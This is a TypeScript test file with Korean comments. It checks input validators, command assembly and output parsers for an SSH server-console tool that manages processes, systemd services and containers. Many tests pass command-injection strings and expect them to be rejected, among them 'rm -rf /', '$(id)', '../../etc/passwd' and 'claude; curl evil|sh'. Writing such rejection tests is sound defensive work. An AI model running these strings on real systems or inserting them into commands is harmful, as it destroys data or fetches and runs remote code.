// F26 서버 콘솔 명령 표 — 이 파일이 지키는 것은 두 가지다.
//
// 1) **인자 검증**: 렌더러가 고른 값이 원격 셸에 그대로 흘러들지 않는가. 여기가 뚫리면 SSH 세션이
//    임의 원격 실행 채널이 된다(F23 이 MCP `shell` 자유 문자열을 S1 결함으로 들어낸 것과 같은 선).
// 2) **파서**: 배포판마다 다른 실제 출력을 제대로 읽는가. 잘못 읽으면 엉뚱한 PID 를 kill 한다.
import { describe, it, expect } from 'vitest'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import {
  COMMANDS,
  buildCommand,
  isCmdId,
  parseDf,
  parseDu,
  parsePs,
  parseSystemctl,
  systemdMissing,
  validAbsPath,
  validPid,
  validSignal,
  validSvcAction,
  validUnit,
  OVERVIEW_SEP,
  PROBE_BINS,
  parseOverview,
  parsePkgProbe,
  parseContainers,
  sortContainers,
  ctrUnavailable,
  validCtrId,
  validCtrAction,
  validImageRef,
  buildCtrExec
} from '../src/shared/remoteCatalog'

describe('인자 검증 — PID', () => {
  it('정상 PID 는 통과', () => {
    expect(validPid(1)).toBe(1)
    expect(validPid(31337)).toBe(31337)
  })

  it('★ 0 과 음수는 거절 — kill(2) 에서 프로세스 그룹 전체를 뜻한다(서버가 통째로 죽는다)', () => {
    expect(validPid(0)).toBeNull()
    expect(validPid(-1)).toBeNull()
    expect(validPid(-31337)).toBeNull()
  })

  it('★ 문자열은 숫자처럼 생겼어도 거절 — 뒤에 뭐가 붙어 올 수 있다', () => {
    expect(validPid('123')).toBeNull()
    expect(validPid('123; rm -rf /')).toBeNull()
  })

  it('소수·NaN·Infinity 거절', () => {
    expect(validPid(1.5)).toBeNull()
    expect(validPid(NaN)).toBeNull()
    expect(validPid(Infinity)).toBeNull()
  })

  it('말도 안 되는 큰 값은 거절(PID 상한 밖)', () => {
    expect(validPid(99_999_999)).toBeNull()
  })
})

describe('인자 검증 — systemd 유닛 이름', () => {
  it('평범한 유닛 이름은 통과(@ 인스턴스 포함)', () => {
    expect(validUnit('nginx.service')).toBe('nginx.service')
    expect(validUnit('getty@tty1.service')).toBe('getty@tty1.service')
  })

  it('★ 셸 메타문자는 전부 거절 — 인용으로 막지 않고 아예 안 받는다', () => {
    for (const bad of [
      'nginx.service; rm -rf /',
      'nginx.service && reboot',
      'nginx.service | tee /etc/passwd',
      'nginx$(id).service',
      'nginx`id`.service',
      "nginx'.service",
      'nginx .service',
      'nginx\n.service',
      // 백슬래시: 주입까지는 아니어도 `a\ b` 로 인자 경계를 흔든다
      'nginx\\ b.service',
      '../../etc/passwd'
    ]) {
      expect(validUnit(bad), bad).toBeNull()
    }
  })

  it('빈 문자열·문자열 아님·과도한 길이 거절', () => {
    expect(validUnit('')).toBeNull()
    expect(validUnit(null)).toBeNull()
    expect(validUnit(42)).toBeNull()
    expect(validUnit('a'.repeat(300))).toBeNull()
  })
})

describe('인자 검증 — 시그널·서비스 동작·경로', () => {
  it('시그널은 TERM·KILL 둘만', () => {
    expect(validSignal('TERM')).toBe('TERM')
    expect(validSignal('KILL')).toBe('KILL')
    expect(validSignal('9')).toBeNull()
    expect(validSignal('STOP')).toBeNull()
  })

  it('서비스 동작은 start·stop·restart 셋만 — enable/disable 은 부팅 동작을 바꾼다', () => {
    expect(validSvcAction('restart')).toBe('restart')
    expect(validSvcAction('enable')).toBeNull()
    expect(validSvcAction('mask')).toBeNull()
  })

  it('경로는 절대경로만, 따옴표·공백·개행 있으면 거절', () => {
    expect(validAbsPath('/var/log')).toBe('/var/log')
    expect(validAbsPath('var/log')).toBeNull()
    expect(validAbsPath("/var/log'; rm -rf /")).toBeNull()
    expect(validAbsPath('/var/my logs')).toBeNull()
    expect(validAbsPath('/var/log\nrm -rf /')).toBeNull()
  })
})

describe('명령 조립', () => {
  it('표에 없는 id 는 아무것도 만들지 않는다', () => {
    expect(isCmdId('ps.list')).toBe(true)
    expect(isCmdId('rm.rf')).toBe(false)
    expect(buildCommand('rm.rf', {})).toBeNull()
    expect(buildCommand(null, {})).toBeNull()
    // 프로토타입 오염 경로로 표를 뚫으려는 시도
    expect(buildCommand('toString', {})).toBeNull()
    expect(buildCommand('constructor', {})).toBeNull()
  })

  it('읽기 명령은 인자 없이 조립된다', () => {
    expect(buildCommand('ps.list', undefined)?.cmd).toContain('ps -eo')
    expect(buildCommand('ps.list', undefined)?.write).toBe(false)
  })

  it('★ 쓰기 명령은 write 로 표시된다 — 호출측이 확인 다이얼로그를 띄우는 근거다', () => {
    expect(buildCommand('ps.kill', { pid: 10, signal: 'TERM' })?.write).toBe(true)
    expect(buildCommand('svc.action', { unit: 'nginx.service', action: 'restart' })?.write).toBe(true)
    expect(buildCommand('disk.usage', undefined)?.write).toBe(false)
  })

  it('kill 은 검증된 PID·시그널로만 조립된다', () => {
    expect(buildCommand('ps.kill', { pid: 4242, signal: 'KILL' })?.cmd).toBe('kill -KILL 4242 2>&1')
  })

  it('★ 인자가 하나라도 틀리면 null — 부분 조립은 없다', () => {
    expect(buildCommand('ps.kill', { pid: 0, signal: 'TERM' })).toBeNull()
    expect(buildCommand('ps.kill', { pid: 10, signal: 'HUP' })).toBeNull()
    expect(buildCommand('ps.kill', {})).toBeNull()
    expect(buildCommand('svc.action', { unit: 'a; reboot', action: 'start' })).toBeNull()
    expect(buildCommand('svc.action', { unit: 'nginx.service', action: 'mask' })).toBeNull()
    expect(buildCommand('disk.du', { path: '/tmp; id' })).toBeNull()
  })

  it('du 경로는 작은따옴표로 감싼다', () => {
    expect(buildCommand('disk.du', { path: '/var/log' })?.cmd).toContain("'/var/log'")
  })

  // F27: AI CLI 설치 확인. 실행 전에 물어 보지 않으면 터미널에 `command not found` 한 줄만 남는다.
  it('which.cli 는 command -v 로 조립된다 — which(1) 이 없는 서버에서도 통하는 셸 내장', () => {
    expect(buildCommand('which.cli', { bin: 'claude' })?.cmd).toBe('command -v claude 2>/dev/null')
    expect(buildCommand('which.cli', { bin: 'claude' })?.write).toBe(false)
    expect(buildCommand('which.cli', { bin: '/usr/local/bin/my-cli' })?.cmd).toBe(
      'command -v /usr/local/bin/my-cli 2>/dev/null'
    )
  })

  it('★ which.cli 의 이름 검증은 shared/aiCli 것과 같은 것을 쓴다 — 확인한 이름과 실행할 이름이 갈리면 안 된다', () => {
    expect(buildCommand('which.cli', { bin: 'claude; curl evil|sh' })).toBeNull()
    expect(buildCommand('which.cli', { bin: 'claude && whoami' })).toBeNull()
    expect(buildCommand('which.cli', { bin: '$(id)' })).toBeNull()
    expect(buildCommand('which.cli', { bin: '' })).toBeNull()
    expect(buildCommand('which.cli', {})).toBeNull()
    expect(buildCommand('which.cli', undefined)).toBeNull()
  })

  it('★ 표의 모든 항목이 인자 없이 불려도 죽지 않는다 — 렌더러가 뭘 보내든 예외는 안 난다', () => {
    for (const id of Object.keys(COMMANDS)) {
      expect(() => buildCommand(id, undefined)).not.toThrow()
      expect(() => buildCommand(id, { pid: 'x', unit: 1, path: [] })).not.toThrow()
    }
  })
})

describe('ps 출력 파싱', () => {
  // 실제 `ps -eo pid=,user=,pcpu=,pmem=,rss=,stat=,etimes=,args=` 모양.
  const OUT = [
    '    1 root      0.0  0.1  12345 Ss     864000 /sbin/init splash',
    ' 1234 jun      12.5  3.2 205000 Sl      12345 /usr/bin/node /srv/app/server.js --port 3000',
    ' 9999 postgres  0.3  8.1 900000 S      864000 postgres: checkpointer',
    ' 4242 jun       0.0  0.0      0 Z           5 [defunct]'
  ].join('\n')

  it('한 줄에 하나씩 읽는다', () => {
    expect(parsePs(OUT)).toHaveLength(4)
  })

  it('★ 공백이 든 명령줄이 잘리지 않는다 — 앞 7칸만 끊고 나머지는 통째로 명령이다', () => {
    const node = parsePs(OUT).find((r) => r.pid === 1234)!
    expect(node.cmd).toBe('/usr/bin/node /srv/app/server.js --port 3000')
    expect(node.user).toBe('jun')
    expect(node.cpu).toBe(12.5)
    expect(node.mem).toBe(3.2)
    expect(node.rssKb).toBe(205000)
  })

  it('콜론·대괄호가 든 명령줄도 그대로', () => {
    expect(parsePs(OUT).find((r) => r.pid === 9999)!.cmd).toBe('postgres: checkpointer')
    expect(parsePs(OUT).find((r) => r.pid === 4242)!.cmd).toBe('[defunct]')
  })

  it('좀비 상태가 보존된다 — 화면에서 눈에 띄게 해야 한다', () => {
    expect(parsePs(OUT).find((r) => r.pid === 4242)!.stat).toBe('Z')
  })

  it('빈 출력·쓰레기 줄은 조용히 버린다(빈 배열, 예외 없음)', () => {
    expect(parsePs('')).toEqual([])
    expect(parsePs('ps: command not found')).toEqual([])
    expect(parsePs('\n\n   \n')).toEqual([])
  })
})

describe('systemctl 출력 파싱', () => {
  const OUT = [
    '  nginx.service                loaded active   running The nginx HTTP and reverse proxy server',
    '● postgresql.service           loaded failed   failed  PostgreSQL RDBMS',
    '  getty@tty1.service           loaded active   running Getty on tty1',
    '  cups.service                 not-found inactive dead  cups.service'
  ].join('\n')

  it('유닛·상태·설명을 갈라 읽는다', () => {
    const rows = parseSystemctl(OUT)
    expect(rows).toHaveLength(4)
    expect(rows[0]).toEqual({
      unit: 'nginx.service',
      load: 'loaded',
      active: 'active',
      sub: 'running',
      desc: 'The nginx HTTP and reverse proxy server'
    })
  })

  it('★ 실패한 유닛 앞의 ● 표시를 걷어낸다 — 안 걷으면 유닛 이름이 ● 가 된다', () => {
    const failed = parseSystemctl(OUT).find((r) => r.unit === 'postgresql.service')!
    expect(failed.active).toBe('failed')
  })

  it('@ 인스턴스 유닛도 읽는다', () => {
    expect(parseSystemctl(OUT).some((r) => r.unit === 'getty@tty1.service')).toBe(true)
  })

  it('systemd 가 없는 서버를 구분한다 — 빈 목록과 "지원 안 함"은 다른 이야기다', () => {
    expect(systemdMissing('bash: systemctl: command not found')).toBe(true)
    expect(systemdMissing('Failed to connect to bus: No such file or directory')).toBe(true)
    expect(systemdMissing(OUT)).toBe(false)
  })
})

describe('df 출력 파싱', () => {
  const OUT = [
    'Filesystem     Type     1024-blocks      Used Available Capacity Mounted on',
    '/dev/sda1      ext4        41251136  12345678  26800000      32% /',
    'tmpfs          tmpfs        4096000         0   4096000       0% /dev/shm',
    '/dev/sdb1      xfs        209715200 199229440  10485760      95% /data'
  ].join('\n')

  it('헤더를 건너뛰고 항목만 읽는다', () => {
    const rows = parseDf(OUT)
    expect(rows).toHaveLength(3)
    expect(rows[0].mount).toBe('/')
    expect(rows[0].type).toBe('ext4')
    expect(rows[0].usePct).toBe(32)
  })

  it('가상 파일시스템도 그대로 돌려준다 — 무엇을 숨길지는 화면이 정한다', () => {
    expect(parseDf(OUT).some((r) => r.type === 'tmpfs')).toBe(true)
  })

  it('공백이 든 마운트 경로도 끝까지 읽는다', () => {
    const rows = parseDf('/dev/sdc1 ext4 100 50 50 50% /mnt/my disk')
    expect(rows[0].mount).toBe('/mnt/my disk')
  })

  it('빈 출력은 빈 배열', () => {
    expect(parseDf('')).toEqual([])
  })
})

describe('du 출력 파싱', () => {
  it('큰 폴더부터 정렬해 돌려준다 — 용량 찾을 때 위에서부터 본다', () => {
    const rows = parseDu(['4\t/var/log/small', '1048576\t/var/log/journal', '2048\t/var/log/nginx'].join('\n'))
    expect(rows.map((r) => r.path)).toEqual(['/var/log/journal', '/var/log/nginx', '/var/log/small'])
    expect(rows[0].kb).toBe(1048576)
  })

  it('공백이 든 경로도 읽는다', () => {
    expect(parseDu('123\t/var/my logs')[0].path).toBe('/var/my logs')
  })

  it('빈 출력·쓰레기는 빈 배열', () => {
    expect(parseDu('')).toEqual([])
    expect(parseDu('du: cannot read directory')).toEqual([])
  })
})

// ── F26 R3 ──────────────────────────────────────────────────────────────────

describe('서버 개요 파싱(sys.overview)', () => {
  const join = (...p: string[]) => p.join(`\n${OVERVIEW_SEP}\n`)

  it('배포판·커널·호스트명·가동시간을 한 왕복 출력에서 읽는다', () => {
    const o = parseOverview(join('Ubuntu 22.04.4 LTS', '5.15.0-91-generic', 'Linux', 'dev-server', '1053492.31 2100.5'))
    expect(o.distro).toBe('Ubuntu 22.04.4 LTS')
    expect(o.kernel).toBe('5.15.0-91-generic')
    expect(o.hostname).toBe('dev-server')
    expect(o.uptimeSec).toBe(1053492)
  })

  it('/etc/os-release 가 없으면 uname 으로 떨어진다 — 전체를 실패로 만들지 않는다', () => {
    const o = parseOverview(join('', '4.19.0', 'Linux', 'router', '900.00 100.0'))
    expect(o.distro).toBe('Linux') // 빈칸 대신 아는 것
    expect(o.kernel).toBe('4.19.0')
  })

  it('가동시간을 못 읽으면 null — 0 으로 쓰면 "방금 켜짐"이라는 거짓말이 된다', () => {
    expect(parseOverview(join('D', 'k', 'Linux', 'h', '')).uptimeSec).toBeNull()
    expect(parseOverview(join('D', 'k', 'Linux', 'h', 'garbage')).uptimeSec).toBeNull()
  })

  it('출력이 통째로 비어도 던지지 않는다', () => {
    const o = parseOverview('')
    expect(o.distro).toBe('')
    expect(o.uptimeSec).toBeNull()
  })
})

describe('설치된 프로그램 파싱(pkg.probe)', () => {
  it('bin·경로·버전·설치일을 읽고, nvm 처럼 홈 밑에 깐 것도 그대로 잡는다', () => {
    const out = [
      'node\t/home/jun/.nvm/versions/node/v20.11.1/bin/node\tv20.11.1\t1710374400',
      'git\t/usr/bin/git\tgit version 2.43.0\t1699999999'
    ].join('\n')
    const rows = parsePkgProbe(out)
    expect(rows).toHaveLength(2)
    expect(rows[0].bin).toBe('node')
    expect(rows[0].path).toContain('.nvm') // 패키지 목록에는 없는 것 — 이게 이 방식을 쓰는 이유다
    expect(rows[0].installedAt).toBe(1710374400 * 1000)
    // 앞에 붙는 자기 이름은 걷어 낸다.
    expect(rows[1].version).toBe('2.43.0')
  })

  it('콜론 형태(`nginx version: nginx/1.24.0`)도 걷어 낸다 — CON-19 가 잡은 구멍', () => {
    const rows = parsePkgProbe('nginx	/usr/sbin/nginx	nginx version: nginx/1.24.0	1699999999')
    expect(rows[0].version).toBe('nginx/1.24.0')
  })

  it('이름에 정규식 특수문자가 있어도 안전하다', () => {
    expect(parsePkgProbe('c++	/usr/bin/c++	c++ 11.4.0	1').at(0)?.version).toBe('11.4.0')
  })

  it('버전 형태를 못 알아보면 원문을 그대로 싣는다(억지로 자르지 않는다)', () => {
    expect(parsePkgProbe('mystery\t/usr/bin/mystery\tbuild 7 (deadbeef)\t0')[0].version).toBe('build 7 (deadbeef)')
  })

  it('mtime 이 없거나 0 이면 설치일은 null(1970년으로 표시하지 않는다)', () => {
    expect(parsePkgProbe('jq\t/usr/bin/jq\t1.6\t')[0].installedAt).toBeNull()
    expect(parsePkgProbe('jq\t/usr/bin/jq\t1.6\t0')[0].installedAt).toBeNull()
  })

  it('없는 프로그램은 줄 자체가 없다 · 깨진 줄은 건너뛴다', () => {
    expect(parsePkgProbe('')).toEqual([])
    expect(parsePkgProbe('쓰레기\n\n\tpath만있음\t\t')).toEqual([])
  })
})

// 명령 하나가 아니라 **표 전체**가 지켜야 하는 규칙이다. pkg.probe 한 곳만 고치면 다음에 새 명령을
// 넣는 사람이 같은 함정을 다시 밟는다 — 그래서 소스를 통째로 훑는다(2026-08-13 빈 표 사고).
describe('셸 이식성 — echo 로 이스케이프를 내보내지 않는다', () => {
  it('★ 명령 표 어디에도 백슬래시 이스케이프를 담은 echo 가 없다', () => {
    const src = readFileSync(join(__dirname, '../src/shared/remoteCatalog.ts'), 'utf8')
    // 주석 줄은 뺀다 — 이 규칙을 설명하는 주석 자체가 걸린다.
    const offenders = src
      .split('\n')
      .filter((l) => !l.trim().startsWith('//'))
      // 소스에 `\\t`(문자열 리터럴) 로 적히든 `\t`(템플릿) 로 적히든 둘 다 잡는다.
      .filter((l) => /echo\s+["'][^"']*\\\\?[nt]/.test(l))
    expect(offenders).toEqual([])
  })
})

describe('pkg.probe 보안 — 조사 목록은 고정이고 안전한 이름만', () => {
  it('렌더러가 이름을 못 보낸다 — args 를 무엇으로 주든 같은 명령이 나온다', () => {
    const a = buildCommand('pkg.probe', null)
    const b = buildCommand('pkg.probe', { bins: ['; rm -rf /'] })
    expect(a).not.toBeNull()
    expect(a!.cmd).toBe(b!.cmd) // 인자가 명령에 영향을 주지 않는다
    expect(a!.write).toBe(false)
  })

  it('고정 목록의 모든 이름이 셸 메타문자 없는 순수 이름이다', () => {
    for (const b of PROBE_BINS) expect(b).toMatch(/^[a-z0-9][a-z0-9._-]*$/)
  })

  it('조사 목록의 이름이 전부 명령에 들어간다(빠뜨린 것 없음)', () => {
    const cmd = buildCommand('pkg.probe', null)!.cmd
    for (const b of PROBE_BINS) expect(cmd).toContain(`b=${b};`)
  })

  it('★ 줄을 조립할 때 echo 가 아니라 printf 를 쓴다 — bash 내장 echo 는 \\t 를 탭으로 안 바꾼다', () => {
    const cmd = buildCommand('pkg.probe', null)!.cmd
    expect(cmd).toContain("printf '%s\\t%s\\t%s\\t%s\\n'")
    expect(cmd).not.toContain('echo "$b')
  })

  it('sys.overview 도 인자를 받지 않는다(읽기 전용·고정)', () => {
    const o = buildCommand('sys.overview', { anything: 'x' })
    expect(o).not.toBeNull()
    expect(o!.write).toBe(false)
    expect(o!.cmd).toContain(OVERVIEW_SEP)
  })
})

// ── F28 컨테이너 ────────────────────────────────────────────────────────────

describe('컨테이너 목록 파싱(ctr.list)', () => {
  const OUT = [
    'a1b2c3\tweb\tnginx:1.24\trunning\tUp 3 days\t0.0.0.0:80->80/tcp',
    'd4e5f6\tdb\tpostgres:16\texited\tExited (0) 2 hours ago\t',
    '99aa\tcache\tredis:7\trunning\tUp 10 minutes\t6379/tcp'
  ].join('\n')

  it('6칸을 읽고 상태는 소문자로 맞춘다', () => {
    const rows = parseContainers(OUT)
    expect(rows).toHaveLength(3)
    expect(rows[0]).toEqual({
      id: 'a1b2c3',
      name: 'web',
      image: 'nginx:1.24',
      state: 'running',
      status: 'Up 3 days',
      ports: '0.0.0.0:80->80/tcp'
    })
  })

  it('멈춘 컨테이너는 포트 칸이 비어 있어도 읽는다', () => {
    expect(parseContainers(OUT)[1].ports).toBe('')
    expect(parseContainers(OUT)[1].state).toBe('exited')
  })

  it('멈춘 것이 위로 온다 — "뭐가 죽었나"가 이 화면을 여는 이유다', () => {
    expect(sortContainers(parseContainers(OUT)).map((r) => r.name)).toEqual(['db', 'cache', 'web'])
  })

  it('형태가 아닌 줄(권한 오류 등)은 건너뛴다', () => {
    expect(parseContainers('permission denied while trying to connect')).toEqual([])
    expect(parseContainers('')).toEqual([])
  })

  it('런타임 없음·데몬 못 붙음·권한 없음을 빈 목록과 구분한다', () => {
    expect(ctrUnavailable('docker: command not found')).toBe(true)
    expect(ctrUnavailable('Cannot connect to the Docker daemon at unix:///var/run/docker.sock')).toBe(true)
    expect(ctrUnavailable('permission denied while trying to connect to the Docker daemon socket')).toBe(true)
    // 진짜로 컨테이너가 하나도 없는 경우는 안내가 아니라 빈 표다.
    expect(ctrUnavailable('')).toBe(false)
  })

  it('명령은 docker 를 먼저 보고 없으면 podman 으로 떨어진다 · 인자를 받지 않는다', () => {
    const a = buildCommand('ctr.list', null)
    const b = buildCommand('ctr.list', { name: '; rm -rf /' })
    expect(a!.cmd).toBe(b!.cmd) // 렌더러가 명령에 영향을 줄 수 없다
    expect(a!.write).toBe(false) // 목록은 읽기 전용
    expect(a!.cmd).toContain('command -v docker')
    expect(a!.cmd).toContain('podman ps -a')
  })
})

describe('컨테이너 조작 — 인자 검증(F28 R2)', () => {
  it('컨테이너 id 는 16진수만 받는다 — 이름·메타문자는 거절', () => {
    expect(validCtrId('a1b2c3d4e5f6')).toBe('a1b2c3d4e5f6')
    expect(validCtrId('a'.repeat(64))).toHaveLength(64)
    expect(validCtrId('web')).toBeNull() // 이름은 안 받는다(id 만 온다)
    expect(validCtrId('a1b2c3; rm -rf /')).toBeNull()
    expect(validCtrId('A1B2C3D4E5F6')).toBeNull() // 대문자는 docker 가 주지 않는다
    expect(validCtrId('a1b2')).toBeNull() // 너무 짧다
    expect(validCtrId(12)).toBeNull()
  })

  it('★ 할 수 있는 일은 여섯 가지뿐 — rm -f 도 exec 도 여기 없다', () => {
    for (const a of ['start', 'stop', 'restart', 'pause', 'unpause', 'rm']) expect(validCtrAction(a)).toBe(a)
    expect(validCtrAction('exec')).toBeNull()
    expect(validCtrAction('rm -f')).toBeNull()
    expect(validCtrAction('kill')).toBeNull()
  })

  it('이미지 참조는 셸 메타문자를 하나도 허용하지 않는다', () => {
    expect(validImageRef('nginx:1.24-alpine')).toBe('nginx:1.24-alpine')
    expect(validImageRef('reg.local:5000/team/app@sha256:abc')).toBe('reg.local:5000/team/app@sha256:abc')
    expect(validImageRef('nginx; rm -rf /')).toBeNull()
    expect(validImageRef('$(id)')).toBeNull()
    expect(validImageRef('a`b`')).toBeNull()
    expect(validImageRef('')).toBeNull()
  })

  it('★ 검증에 걸리면 명령 자체가 조립되지 않는다(null)', () => {
    expect(buildCommand('ctr.action', { id: 'web', action: 'stop' })).toBeNull()
    expect(buildCommand('ctr.action', { id: 'a1b2c3d4e5f6', action: 'exec' })).toBeNull()
    expect(buildCommand('ctr.action', null)).toBeNull()
    expect(buildCommand('ctr.rmi', { image: 'x; reboot' })).toBeNull()
  })

  it('통과하면 목록과 같은 런타임을 타고, 쓰기로 표시된다', () => {
    const r = buildCommand('ctr.action', { id: 'a1b2c3d4e5f6', action: 'stop' })!
    expect(r.write).toBe(true)
    expect(r.cmd).toContain('docker stop a1b2c3d4e5f6')
    expect(r.cmd).toContain('podman stop a1b2c3d4e5f6')
    expect(buildCommand('ctr.rmi', { image: 'nginx:1.24' })!.cmd).toContain('docker rmi nginx:1.24')
  })

  it('★ 컨테이너 접속은 터미널용 문자열이고, id 가 나쁘면 만들어지지 않는다', () => {
    // 이 한 줄만 exec 채널이 아니라 session.input 으로 나간다(대화형이라 그렇다).
    const cmd = buildCtrExec('a1b2c3d4e5f6')!
    expect(cmd).toContain('exec -it a1b2c3d4e5f6')
    expect(cmd).toContain('command -v docker || command -v podman')
    expect(cmd).toContain('exec bash || exec sh') // bash 가 없는 이미지 대비
    expect(buildCtrExec('web')).toBeNull()
    expect(buildCtrExec('a1b2c3d4e5f6; reboot')).toBeNull()
  })
})
